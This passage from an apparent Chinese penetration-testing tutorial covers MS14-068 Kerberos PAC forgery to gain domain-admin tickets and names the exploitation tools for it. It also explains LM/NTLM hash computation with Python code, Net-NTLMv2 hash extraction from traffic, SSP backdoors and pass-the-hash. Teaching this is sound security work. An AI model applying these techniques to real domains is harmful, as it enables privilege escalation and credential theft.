<p>注意这里的logon_time来自于第一步中生成的AS_REP的enc_part解密后的的authtime，在工具里面右键复制就行</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016faf1d0dcd0df8b3.png"></p>
<ol start="3">
<li>发起一次服务用户是krbtgt的TGS_REQ，此时导入的TGT里面是不含有PAC的(在第一步里面选择include&#x3D;False返回的TGT不含有pac)，然后将我们伪造的PAC是加密放在 enc-authorization-data里面。加密用的key的放在PA-DATA里面的AP_REQ。此时返回的TGS里面就含有我们伪造的PAC。在之前的文章里面我们说过，在TGS里面，如果请求的服务是krbtgt的话，那么返回的TGS票据是可以当做TGT的。在我们的kerbreos测试工具里面，只需要导入上面makepac.py生成的pac文件。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01fb7979dfaa15534e.png"></p>
<ol start="4">
<li>Pass the ticket</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ccbf4c0e16e5b81f.png"></p>
<p>这里面使用kerberos 测试工具只是为了理清楚漏洞流程。更为方便的利用请见底下。</p>
<h3 id="部分相关的工具-1"><a href="#部分相关的工具-1" class="headerlink" title="部分相关的工具"></a>部分相关的工具</h3><h4 id="kekeo"><a href="#kekeo" class="headerlink" title="kekeo"></a>kekeo</h4><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0188cea9720b626dec.png"></p>
<h4 id="impacket-2"><a href="#impacket-2" class="headerlink" title="impacket"></a>impacket</h4><ul>
<li>goldenPac.py</li>
</ul>
<p>这个工具是结合ms14-068加psexec</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01fc7bd4e71e733937.png"></p>
<h4 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h4><ul>
<li>ms14_068_kerberos_checksum</li>
</ul>
<p>msf的这个模块也支持14068攻击利用</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt013dfb696027765364.png"></p>
<h4 id="pykek"><a href="#pykek" class="headerlink" title="pykek"></a>pykek</h4><p>全称是<code>Python Kerberos Exploitation Kit</code></p>
<p>应该是ms14068漏洞利用，使用的最广泛的一个，一般常用的ms14068.exe，就是由他打包而成的</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01bd4cd580bdb9f1e7.png"></p>
<p>先获取sid</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011cb0f2482c63d3b2.png"></p>
<p>拼接成<code>S-1-5-21-866784659-4049716574-3063611777-1104</code></p>
<p>生成tgt</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0192b5103cce31cc74.png"></p>
<p>验证tgt是否具备域管权限</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f84fbfeeb70e2b7b.png"></p>
<h1 id="NTLM-篇"><a href="#NTLM-篇" class="headerlink" title="NTLM 篇"></a>NTLM 篇</h1><h2 id="NTLM-基础"><a href="#NTLM-基础" class="headerlink" title="NTLM 基础"></a>NTLM 基础</h2><h3 id="前言-4"><a href="#前言-4" class="headerlink" title="前言"></a>前言</h3><p>这个系列文章主要讲ntlm认证相关的内容。以及着重介绍ntlm两大安全问题–PTH和ntlm_relay。</p>
<p>ntlm篇分为四篇文章</p>
<p>第1篇文章也是本文，这篇文章主要简单介绍一些基础概念以及引进一些相关的漏洞，比如<code>Pass The Hash</code>以及<code>ntlm_relay</code>。</p>
<p>其余三篇文章的内容全部都是讲<code>ntlm_relay</code>,这个安全问题是ntlm篇的重点内容。</p>
<p>第2篇文章主要讲触发windows向攻击者发起ntlm请求的一些方式,比如大家耳熟能详的打印机漏洞。</p>
<p>第3篇文章主要讲的是攻击者接收到ntlm请求之后做的事，如爆破<code>Net-ntlm</code>，又或者relay到SMB,HTTP,Exchange,LDAP等。</p>
<p>第4篇文章主要回顾一下从上世纪<code>ntlm_relay</code>被提出来，微软从08年开始为<code>ntlm_relay</code>陆陆续续推出的一些补丁以及绕过,如<code>ms08068</code>，<code>MS16-075</code>，<code>CVE-2015-0005</code>，<code>CVE-2018-8581</code>，<code>CVE-2019-1040</code>,<code>CVE2019-1384</code>。以及ntlm relay的一些缓解措施。</p>
<h3 id="LM-Hash-amp-NTLM-Hash"><a href="#LM-Hash-amp-NTLM-Hash" class="headerlink" title="LM Hash &amp; NTLM Hash"></a>LM Hash &amp; NTLM Hash</h3><p>windows内部是不保存明文密码的，只保存密码的hash。</p>
<p>其中本机用户的密码hash是放在 本地的SAM文件 里面，域内用户的密码hash是存在域控的NTDS.DIT文件 里面。那hash的格式是怎么样的呢?</p>
<p>在Windows系统导出密码的时候，经常看到这样的密码格式</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:<span class="number">500</span>:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br></pre></td></tr></table></figure>

<p>其中的<code>AAD3B435B51404EEAAD3B435B51404EE</code>是LM Hash<br>​<br><code>31D6CFE0D16AE931B73C59D7E0C089C0</code>是NTLM Hash</p>
<p>下面详细介绍下这两种hash格式。</p>
<h4 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h4><p>全称是LAN Manager Hash, windows最早用的加密算法，由IBM设计。</p>
<p>LM Hash的计算:</p>
<ol>
<li>用户的密码转换为大写，密码转换为16进制字符串，不足14字节将会用0来再后面补全。</li>
<li>密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</li>
<li>再分7bit为一组,每组末尾加0，再组成一组</li>
<li>上步骤得到的二组，分别作为key 为 <code>KGS!@#$%</code>进行DES加密。</li>
<li>将加密后的两组拼接在一起，得到最终LM HASH值。</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DesEncrypt</span>(<span class="params"><span class="built_in">str</span>, Des_Key</span>):</span><br><span class="line">    k = des(binascii.a2b_hex(Des_Key), ECB, pad=<span class="literal">None</span>)</span><br><span class="line">    EncryptStr = k.encrypt(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.b2a_hex(EncryptStr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">group_just</span>(<span class="params">length,text</span>):</span><br><span class="line">    <span class="comment"># text 00110001001100100011001100110100001101010011011000000000</span></span><br><span class="line">    text_area = re.findall(<span class="string">r&#x27;.&#123;%d&#125;&#x27;</span> % <span class="built_in">int</span>(length), text) <span class="comment"># [&#x27;0011000&#x27;, &#x27;1001100&#x27;, &#x27;1000110&#x27;, &#x27;0110011&#x27;, &#x27;0100001&#x27;, &#x27;1010100&#x27;, &#x27;1101100&#x27;, &#x27;0000000&#x27;]</span></span><br><span class="line">    text_area_padding = [i + <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> text_area] <span class="comment">#[&#x27;00110000&#x27;, &#x27;10011000&#x27;, &#x27;10001100&#x27;, &#x27;01100110&#x27;, &#x27;01000010&#x27;, &#x27;10101000&#x27;, &#x27;11011000&#x27;, &#x27;00000000&#x27;]</span></span><br><span class="line">    hex_str = <span class="string">&#x27;&#x27;</span>.join(text_area_padding) <span class="comment"># 0011000010011000100011000110011001000010101010001101100000000000</span></span><br><span class="line">    hex_int = <span class="built_in">hex</span>(<span class="built_in">int</span>(hex_str, <span class="number">2</span>))[<span class="number">2</span>:].rstrip(<span class="string">&quot;L&quot;</span>) <span class="comment">#30988c6642a8d800</span></span><br><span class="line">    <span class="keyword">if</span> hex_int == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        hex_int = <span class="string">&#x27;0000000000000000&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> hex_int</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lm_hash</span>(<span class="params">password</span>):</span><br><span class="line">    <span class="comment"># 1. 用户的密码转换为大写，密码转换为16进制字符串，不足14字节将会用0来再后面补全。</span></span><br><span class="line">    pass_hex = password.upper().encode(<span class="string">&quot;hex&quot;</span>).ljust(<span class="number">28</span>,<span class="string">&#x27;0&#x27;</span>) <span class="comment">#3132333435360000000000000000</span></span><br><span class="line">    <span class="built_in">print</span>(pass_hex) </span><br><span class="line">    <span class="comment"># 2. 密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</span></span><br><span class="line">    left_str = pass_hex[:<span class="number">14</span>] <span class="comment">#31323334353600</span></span><br><span class="line">    right_str = pass_hex[<span class="number">14</span>:] <span class="comment">#00000000000000</span></span><br><span class="line">    left_stream = <span class="built_in">bin</span>(<span class="built_in">int</span>(left_str, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>) <span class="comment"># 00110001001100100011001100110100001101010011011000000000</span></span><br><span class="line">    right_stream = <span class="built_in">bin</span>(<span class="built_in">int</span>(right_str, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>) <span class="comment"># 00000000000000000000000000000000000000000000000000000000</span></span><br><span class="line">    <span class="comment"># 3. 再分7bit为一组,每组末尾加0，再组成一组</span></span><br><span class="line">    left_stream = group_just(<span class="number">7</span>,left_stream) <span class="comment"># 30988c6642a8d800</span></span><br><span class="line">    right_stream = group_just(<span class="number">7</span>,right_stream) <span class="comment"># 0000000000000000</span></span><br><span class="line">    <span class="comment"># 4. 上步骤得到的二组，分别作为key 为 &quot;KGS!@#$%&quot;进行DES加密。</span></span><br><span class="line">    left_lm = DesEncrypt(<span class="string">&#x27;KGS!@#$%&#x27;</span>,left_stream) <span class="comment">#44efce164ab921ca</span></span><br><span class="line">    right_lm = DesEncrypt(<span class="string">&#x27;KGS!@#$%&#x27;</span>,right_stream) <span class="comment"># aad3b435b51404ee</span></span><br><span class="line">    <span class="comment"># 5. 将加密后的两组拼接在一起，得到最终LM HASH值。</span></span><br><span class="line">    <span class="keyword">return</span> left_lm + right_lm</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">hash</span> = lm_hash(<span class="string">&quot;123456&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0172bd50f22e19481b.png"></p>
<p>LM加密算法存在一些固有的漏洞</p>
<ol>
<li><p>首先，密码长度最大只能为14个字符</p>
</li>
<li><p>密码不区分大小写。在生成哈希值之前，所有密码都将转换为大写</p>
</li>
<li><p>查看我们的加密过程，就可以看到使用的是分组的DES，如果密码强度是小于7位，那么第二个分组加密后的结果肯定是aad3b435b51404ee，如果我们看到lm hash的结尾是aad3b435b51404ee，就可以很轻易的发现密码强度少于7位</p>
</li>
<li><p>一个14个字符的密码分成7 + 7个字符，并且分别为这两个半部分计算哈希值。这种计算哈希值的方式使破解难度大大降低，这使得14个字符的密码的有效强度等于，7个字符的密码的两倍，该密码的复杂度明显低于  14个字符的密码的理论强度。</p>
</li>
<li><p>Des密码强度不高</p>
</li>
</ol>
<h4 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h4><p>为了解决LM加密和身份验证方案中固有的安全弱点，Microsoft 于1993年在Windows NT 3.1中引入了NTLM协议。下面是各个版本对LM和NTLM的支持。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b500665781a9a455.png"></p>
<p>其中</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01004834cdf230e43d.png"></p>
<p>也就是说从Windows Vista 和 Windows Server 2008开始，默认情况下只存储NTLM Hash，LM Hash将不再存在。(因此后面我们介绍身份认证的时候只介绍Net-ntlm，不再介绍net-lm)如果空密码或者不储蓄LM Hash的话，我们抓到的LM Hash是<code>AAD3B435B51404EEAAD3B435B51404EE</code>。</p>
<p>所以在win7 中我们看到抓到LM Hash都是<code>AAD3B435B51404EEAAD3B435B51404EE</code>，这里的LM Hash并没有价值。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018c4fbb07e30d463f.png"></p>
<p>但某些工具的参数需要填写固定格式<code>LM hash:NT hash</code>，可以将LM hash填0(LM hash可以为任意值)，即00000000000000000000000000000000:NT hash。</p>
<p>接下来讲下NTLM Hash的计算</p>
<ol>
<li>先将用户密码转换为十六进制格式。</li>
<li>将十六进制格式的密码进行Unicode编码。</li>
<li>使用MD4摘要算法对Unicode编码数据进行Hash计算</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 <span class="literal">-c</span> <span class="string">&#x27;import hashlib,binascii; print binascii.hexlify(hashlib.new(&quot;md4&quot;, &quot;p@Assword!123&quot;.encode(&quot;utf-16le&quot;)).digest())&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019d1c6be66d5b0c4f.png"></p>
<h3 id="NTLM身份验证"><a href="#NTLM身份验证" class="headerlink" title="NTLM身份验证"></a>NTLM身份验证</h3><p>NTLM验证是一种Challenge&#x2F;Response 验证机制，由三种消息组成:通常称为<code>type 1(协商)</code>，<code>类型type 2(质询)</code>和<code>type 3(身份验证)</code>。</p>
<p>它基本上是这样工作的:</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d0dfdfd6d7007c80.png"></p>
<ol>
<li><p>用户登录客户端电脑</p>
</li>
<li><p>(type 1)客户端向服务器发送type 1(协商)消息,它主要包含客户端支持和服务器请求的功能列表。</p>
</li>
<li><p>(type 2)服务器用type 2消息(质询)进行响应，这包含服务器支持和同意的功能列表。但是，最重要的是，它包含服务器产生的Challenge。</p>
</li>
<li><p>(type 3)客户端用type 3消息(身份验证)回复质询。用户接收到步骤3中的challenge之后，使用用户hash与challenge进行加密运算得到response，将response,username,challeng发给服务器。消息中的response是最关键的部分，因为它们向服务器证明客户端用户已经知道帐户密码。</p>
</li>
<li><p>服务器拿到type 3之后，使用challenge和用户hash进行加密得到response2与type 3发来的response进行比较。如果用户hash是存储在域控里面的话，那么没有用户hash，也就没办法计算response2。也就没法验证。这个时候用户服务器就会通过netlogon协议联系域控，建立一个安全通道,然后将type 1,type 2，type3 全部发给域控(这个过程也叫作Pass Through Authentication认证流程)</p>
</li>
<li><p>域控使用challenge和用户hash进行加密得到response2，与type 3的response进行比较</p>
</li>
</ol>
<p>下面简单介绍下三个过程，如果对于细节不感兴趣的话就可以忽略。</p>
<h4 id="type-1-协商"><a href="#type-1-协商" class="headerlink" title="type 1 协商"></a>type 1 协商</h4><p>这个过程是客户端向服务器发送type 1(协商)消息,它主要包含客户端支持和服务器请求的功能列表。</p>
<p>主要包含以下结构</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ec11da7d0c1ee154.png"></p>
<p>抓包查看对应的信息如下</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0144831acec02cd75f.png"></p>
<p>如果想仔细理解每个字段的值请阅读官方文档<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/b34032e5-3aae-4bc6-84c3-c6d80eadf7f2">NEGOTIATE_MESSAGE</a></p>
<h4 id="type-2-质询"><a href="#type-2-质询" class="headerlink" title="type 2 质询"></a>type 2 质询</h4><p>这个过程是服务器用type 2消息(质询)进行响应，这包含服务器支持和同意的功能列表。但是，最重要的是，它包含服务器产生的Challenge。</p>
<p>主要包含以下结构</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01356cac29ba604cbb.png"></p>
<p>其中最主要的信息是challenge。后面加密验证依赖于challenge</p>
<p>抓包查看对应的信息如下</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017f0ae4b36b11e5ae.png"></p>
<p>如果想仔细理解每个字段的值请阅读官方文档<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/801a4681-8809-4be9-ab0d-61dcfe762786">CHALLENGE_MESSAGE</a></p>
<h4 id="type-3-身份验证"><a href="#type-3-身份验证" class="headerlink" title="type 3 身份验证"></a>type 3 身份验证</h4><p>这个过程客户端接收到challenge之后，使用用户hash与challenge进行加密运算得到response，将response,username,challenge发给服务器。消息中的response是最关键的部分，因为它向服务器证明客户端用户已经知道帐户密码。</p>
<p>主要包含以下结构</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt015806cf60eb39a716.png"></p>
<p>这里的Challeng不同于type2 的Challenge，这里的Challenge是一个随机的客户端nonce。</p>
<p>MIC是校验和，设计MIC主要是为了防止这个包中途被修改</p>
<p>session_key是在要求进行签名的时候用的，用来进行协商加密密钥，可能有些文章会说session_key就是加密密钥，需要拥有用户hash才能计算出来，因此攻击者算不出来，就无法加解密包。但是想想就不可能，这个session_key已经在流量里面明文传输，那攻击者拿到之后不就可以直接加解密包了。当然这是后话，后面讲签名的时候会详细讲讲这个问题。</p>
<p>抓包查看对应的信息如下</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010fe86d086e7fb634.png"></p>
<p>如果想仔细理解每个字段的值请阅读官方文档<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/033d32cc-88f9-4483-9bf2-b273055038ce">AUTHENTICATE_MESSAGE</a></p>
<h3 id="Net-ntlm-hash"><a href="#Net-ntlm-hash" class="headerlink" title="Net-ntlm hash"></a>Net-ntlm hash</h3><p>在type3中的响应，有六种类型的响应</p>
<ul>
<li><p>LM(LAN Manager)响应 - 由大多数较早的客户端发送，这是<code>原始</code>响应类型。</p>
</li>
<li><p>NTLM v1响应 - 这是由基于NT的客户端发送的，包括Windows 2000和XP。</p>
</li>
<li><p>NTLMv2响应 - 在<code>Windows NT Service Pack 4</code>中引入的一种较新的响应类型。它替换启用了 NTLM版本2的系统上的NTLM响应。</p>
</li>
<li><p>LMv2响应 - 替代NTLM版本2系统上的LM响应。</p>
</li>
<li><p>NTLM2会话响应 - 用于在没有NTLMv2身份验证的情况下协商NTLM2会话安全性时，此方案会更改LM NTLM响应的语义。</p>
</li>
<li><p>匿名响应 - 当匿名上下文正在建立时使用; 没有提供实际的证书，也没有真正的身份验证。“存 根”字段显示在类型3消息中。<br>这六种使用的加密流程一样，都是前面我们说的 <code>Challenge/Response</code> 验证机制,区别在Challenge和加密算法不同。<br>这里我们侧重讲下NTLM v1响应和NTLMv2响应</p>
</li>
<li><p>v2是16位的Challenge，而v1是8位的Challenge</p>
</li>
<li><p>v1是将 16字节的NTLM hash空填充为21个字节，然后分成三组，每组7比特，作为3DES加密算法的三组密钥，加密Server发来的Challenge。 将这三个密文值连接起来得到response。</p>
</li>
</ul>
<p>而v2是的加密算法是:</p>
<pre><code>1. 将Unicode后的大写用户名与Unicode后的身份验证目标（在Type 3消息的`TargetName`字段中指定的域或服务器名称）拼在一起。请注意，用户名将转换为大写，而身份验证目标区分大小写，并且必须与`TargetName`字段中显示的大小写匹配。使用16字节NTLM哈希作为密钥，得到一个值。

​2. 构建一个blob信息。

​3. 使用16字节NTLMv2哈希作为密钥，将HMAC-MD5消息认证代码算法加密一个值(来自type 2的Challenge与Blob拼接在一起)。得到一个16字节的NTProofStr。

​4. 将NTProofStr与Blob拼接起来形成得到response。
</code></pre>
<p>至于选择哪个版本的响应由LmCompatibilityLevel决定。</p>
<p>Challenge&#x2F;Response验证机制里面type3 response里面包含Net-ntlm hash，NTLM v1响应和NTLMv2响应对应的就是Net-ntlm hash分为Net-ntlm hash v1和Net-ntlm hash v2。</p>
<p>Net-ntlm hash v1的格式为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::hostname:LM response:NTLM response:challenge</span><br></pre></td></tr></table></figure>

<p>Net-ntlm hash v2的格式为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::domain:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure>

<p>下面演示从response里面提取NTLMv2</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010fe86d086e7fb634.png"></p>
<p>这里的challenge是type2 服务器返回的challenge不是type3 流量包里面的client Challenge</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0142cfbdda6bb0776f.png"></p>
<p>就是7ac429882efc7e29</p>
<p>HMAC-MD5对应数据包中的NTProofSt</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d094e48e096807a3.png"></p>
<p>就是</p>
<p><code>0101000000000000772eaacee59dd5014b484239683639570000000001000c00570049004e0037002d00310002000800540045005300540003002200570049004e0037002d0031002e0074006500730074002e006c006f00630061006c000400140074006500730074002e006c006f00630061006c000500140074006500730074002e006c006f00630061006c0007000800772eaacee59dd5010900160063006900660073002f00570049004e0037002d0031000000000000000000</code></p>
<p>所以最后的ntlm v2 hash是</p>
<p><code>win7::test.local:7ac429882efc7e29:00a9055c4007c7eb1c1386504d0a7162:0101000000000000772eaacee59dd5014b484239683639570000000001000c00570049004e0037002d00310002000800540045005300540003002200570049004e0037002d0031002e0074006500730074002e006c006f00630061006c000400140074006500730074002e006c006f00630061006c000500140074006500730074002e006c006f00630061006c0007000800772eaacee59dd5010900160063006900660073002f00570049004e0037002d0031000000000000000000</code></p>
<h3 id="SSP-amp-SSPI"><a href="#SSP-amp-SSPI" class="headerlink" title="SSP &amp; SSPI"></a>SSP &amp; SSPI</h3><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018ada8ed1499cad3a.gif"></p>
<ul>
<li>SSPI(Security Support Provider Interface)</li>
</ul>
<p>这是 Windows 定义的一套接口，此接口定义了与安全有关的功能函数， 用来获得验证、信息完整性、信息隐私等安全功能，就是定义了一套接口函数用来身份验证，签名等，但是没有具体的实现。</p>
<ul>
<li>SSP(Security Support Provider)<br>​<br>SSPI 的实现者，对SSPI相关功能函数的具体实现。微软自己实现了如下的 SSP，用于提供安全功能：</li>
</ul>
<ol>
<li>NTLM SSP</li>
<li>Kerberos</li>
<li>Cred SSP</li>
<li>Digest SSP</li>
<li>Negotiate SSP</li>
<li>Schannel SSP</li>
<li>Negotiate Extensions SSP</li>
<li>PKU2U SSP</li>
</ol>
<p>在系统层面，SSP就是一个dll，来实现身份验证等安全功能，实现的身份验证机制是不一样的。比如 NTLM SSP 实现的就是一种 Challenge&#x2F;Response 验证机制。而 Kerberos 实现的就是基于 ticket 的身份验证机制。我们可以编写自己的 SSP，然后注册到操作系统中，让操作系统支持更多的自定义的身份验证方法。</p>
<p>这个地方可以用于留作后门。这个地方就不详细展开了。下一篇域渗透详细展开</p>
<p>我们抓包分析ntlm的时候，就会看到ntlm是放在GSS-API里面</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ec5c804dd71c97ac.png"></p>
<p>为啥这里会出现GSSAPI呢，SSPI是GSSAPI的一个专有变体，进行了扩展并具有许多特定于Windows的数据类型。SSPI生成和接受的令牌大多与GSS-API兼容。所以这里出现GSSAPI只是为了兼容，我们可以不必理会。可以直接从NTLM SSP开始看起。注册为SSP的一个好处就是，SSP实现了了与安全有关的功能函数，那上层协议(比如SMB)在进行身份认证等功能的时候，就可以不用考虑协议细节，只需要调用相关的函数即可。而认证过程中的流量嵌入在上层协议里面。不像kerbreos，既可以镶嵌在上层协议里面，也可以作为独立的应用层协议。ntlm是只能镶嵌在上层协议里面，消息的传输依赖于使用ntlm的上层协议。比如镶嵌在SMB协议里面是这样。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011a82a996098f3ed4.png"></p>
<p>镶嵌在HTTP协议里面是这样</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01fb68938d1b14c1d6.png"></p>
<h3 id="LmCompatibilityLevel"><a href="#LmCompatibilityLevel" class="headerlink" title="LmCompatibilityLevel"></a>LmCompatibilityLevel</h3><p>此安全设置确定网络登录使用的质询&#x2F;响应身份验证协议。此选项会影响客户端使用的身份验证协议的等级、协商的会话安全的等级以及服务器接受的身份验证的等级，其设置值如下:</p>
<ul>
<li>发送 LM NTLM 响应: 客户端使用 LM 和 NTLM 身份验证，而决不会使用 NTLMv2 会话安全；域控制器接受 LM、NTLM 和 NTLMv2 身份验证。</li>
<li>发送 LM &amp; NTLM - 如果协商一致，则使用 NTLMv2 会话安全: 客户端使用 LM 和 NTLM 身份验证，并且在服务器支持时使用 NTLMv2 会话安全；域控制器接受 LM、NTLM 和 NTLMv2 身份验证。</li>
<li>仅发送 NTLM 响应: 客户端仅使用 NTLM 身份验证，并且在服务器支持时使用 NTLMv2 会话安全；域控制器接受 LM、NTLM 和 NTLMv2 身份验证。</li>
<li>仅发送 NTLMv2 响应: 客户端仅使用 NTLMv2 身份验证，并且在服务器支持时使用 NTLMv2 会话安全；域控制器接受 LM、NTLM 和 NTLMv2 身份验证。</li>
<li>仅发送 NTLMv2 响应\拒绝 LM: 客户端仅使用 NTLMv2 身份验证，并且在服务器支持时使用 NTLMv2 会话安全；域控制器拒绝 LM (仅接受 NTLM 和 NTLMv2 身份验证)。</li>
<li>仅发送 NTLMv2 响应\拒绝 LM &amp; NTLM: 客户端仅使用 NTLMv2 身份验证，并且在服务器支持时使用 NTLMv2 会话安全；域控制器拒绝 LM 和 NTLM (仅接受 NTLMv2 身份验证)。</li>
</ul>
<p>默认值:</p>
<ul>
<li>Windows 2000 以及 Windows XP: 发送 LM &amp; NTLM 响应</li>
<li>Windows Server 2003: 仅发送 NTLM 响应</li>
<li>Windows Vista、Windows Server 2008、Windows 7 以及 Windows Server 2008 R2及以上: 仅发送 NTLMv2 响应</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01facab176e91e17e0.png"></p>
<h3 id="相关的安全问题-2"><a href="#相关的安全问题-2" class="headerlink" title="相关的安全问题"></a>相关的安全问题</h3><h4 id="pass-the-hash"><a href="#pass-the-hash" class="headerlink" title="pass the hash"></a>pass the hash</h4><p>也叫hash传递攻击,简称PTH。</p>
<p>在type3计算response的时候，客户端是使用用户的hash进行计算的，而不是用户密码进行计算的。因此在模拟用户登录的时候。是不需要用户明文密码的，只需要用户hash。微软在2014年5月13日发布了针对Pass The Hash的更新补丁kb2871997，标题为<code>&quot;Update to fix the Pass-The-Hash Vulnerability&quot;</code>,而在一周后却把标题改成了<code>&quot;Update to improve credentials protection and management&quot;</code>。(事实上，这个补丁不仅能够缓解PTH,还能阻止mimikatz 抓取明文密码，本系列文章侧重于协议认证的问题，因此不在这里扩展介绍其他内容)。</p>
<ol>
<li>kb2871997</li>
</ol>
<p>这里来探讨下为啥kb2871997能缓解pth，又不能杜绝Pth。<br>首先kb2871997对于本地Administrator(rid为500，操作系统只认rid不认用户名，接下来我们统称RID 500帐户)和本地管理员组的域用户是没有影响的。<br>在打了kb2871997补丁的机子上</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01af7412a309463115.png"></p>
<p>使用RID 500帐户进行pth登录</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ff872e47cf0ff799.png"></p>
<p>使用本地管理员组的域用户进行pth登录</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt012819b8790a4facf8.png"></p>
<p>使用本地管理员组的非RID 500帐户进行pth登录</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01259f0c2acb39aa9e.png"></p>
